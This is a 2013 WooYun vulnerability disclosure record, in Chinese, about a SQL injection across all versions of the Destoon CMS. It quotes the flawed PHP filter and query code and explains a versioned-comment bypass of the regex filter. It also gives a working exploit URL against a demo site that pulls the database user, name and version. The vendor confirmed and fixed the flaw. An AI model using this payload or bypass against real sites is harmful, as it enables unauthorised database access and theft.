{"id": 6882, "wybug_id": "wooyun-2013-039281", "wybug_title": "Destoon最新全版本通杀SQL注入漏洞", "wybug_corp": "DESTOON", "wybug_author": "Kavia", "wybug_date": "2013-10-10 15:38", "wybug_open_date": "2014-01-08 15:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-08：\t细节向公众公开  简要描述： Destoon最新全版本通杀注入漏洞 详细说明：  /common.inc.php\t 64行：-------------------------------------------------------------------------------------if($_POST) $_POST = strip_sql($_POST);\t//strip_sql()过滤if($_GET) $_GET = strip_sql($_GET);if($_COOKIE) $_COOKIE = strip_sql($_COOKIE);.........if($_POST) extract($_POST, EXTR_SKIP);\t//注册变量if($_GET) extract($_GET, EXTR_SKIP);-------------------------------------------------------------------------------------跟进strip_sql()/include/global.func.php\t186行：-------------------------------------------------------------------------------------function strip_sql($string) {$search = array(\"/union([[:space:]\\/])/i\",\"/select([[:space:]\\/])/i\",\"/update([[:space:]\\/])/i\",\"/replace([[:space:]\\/])/i\",\"/delete([[:space:]\\/])/i\",\"/drop([[:space:]\\/])/i\",\"/outfile([[:space:]\\/])/i\",\"/dumpfile([[:space:]\\/])/i\",\"/load_file\\(/i\",\"/substring\\(/i\",\"/ascii\\(/i\",\"/hex\\(/i\",\"/ord\\(/i\",\"/char\\(/i\");$replace = array('unio&#110;\\\\1','selec&#116;\\\\1','updat&#101;\\\\1','replac&#101;\\\\1','delet&#101;\\\\1','dro&#112;\\\\1','outfil&#101;\\\\1','dumpfil&#101;\\\\1','load_fil&#101;(','substrin&#103;(','asci&#105;(','he&#120;(','or&#100;(','cha&#114;(');return is_array($string) ? array_map('strip_sql', $string) : preg_replace($search, $replace, $string);}------------------------------------------------------------------------------------采用了新的正则表达式，之前西毒放出的exp，已经无法绕过新版本的过滤了。此处可采用新的绕过方式：/!5000union*/首先寻找一个注射点：/module/member/record.inc.php\t16行：-------------------------------------------------------------------------------------------isset($mid) or $mid = 0;isset($currency) or $currency = '';$module_select = module_select('mid', $L['module_name'], $mid);if($keyword) $condition .= \" AND title LIKE '%$keyword%'\";if($fromtime) $condition .= \" AND paytime>\".(strtotime($fromtime.' 00:00:00'));if($totime) $condition .= \" AND paytime<\".(strtotime($totime.' 23:59:59'));if($mid) $condition .= \" AND moduleid=$mid\";if($itemid) $condition .= \" AND itemid=$itemid\";if($currency) $condition .= \" AND currency='$currency'\";$r = $db->get_one(\"SELECT COUNT(*) AS num FROM {$DT_PRE}finance_pay WHERE $condition\");//$pages = pages($r['num'], $page, $pagesize);$lists = array();echo \"SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize\";$result = $db->query(\"SELECT * FROM {$DT_PRE}finance_pay WHERE $condition ORDER BY pid DESC LIMIT $offset,$pagesize\");------------------------------------------------------------------------------此处利用变量覆盖，就可以顺利构造sql注入/member/record.php-----------------------------------------------------------------------------<?php require 'config.inc.php';require '../common.inc.php';require DT_ROOT.'/module/'.$module.'/record.inc.php';?>------------------------------------------------------------------------------引入了common.inc.php，所以存在变量覆盖。并且可以绕过正则的过滤。最终造成sql注入exp：http://demo.destoon.com/v5.0/member/record.php?action=pay&mid=-1/*!50000union*//*!50000select*/user(),2,database(),version(),5,6,7,8,9--   漏洞证明：  \n\n   修复方案：  你们更懂   版权声明：转载请注明来源 Kavia@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-10 20:01 厂商回复： 已经修复 详见 http://bbs.destoon.com/thread-54159-1-1.html 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-10 16:03 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  全版本通杀 霸气    \n     2013-10-10 16:29 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  高端大气上档次    \n     2013-10-10 16:41 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  全版本无解了    \n     2013-10-10 17:02 |    \t\tlaterain \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Just For Fun.)\t\t \n  我看到你在360卖0day了，恭喜发财^。^    \n     2013-10-10 17:03 |    \t\tKavia \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        )\t\t \n  @laterain 你看到的是假象，360把我的那个洞忽略了的    \n     2013-10-11 18:24 |    \t\t马里奥，大叔 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 纯屌丝)\t\t \n  mark    \n     2013-10-13 21:22 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  我看到你在360卖0day了，恭喜发财^。^    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}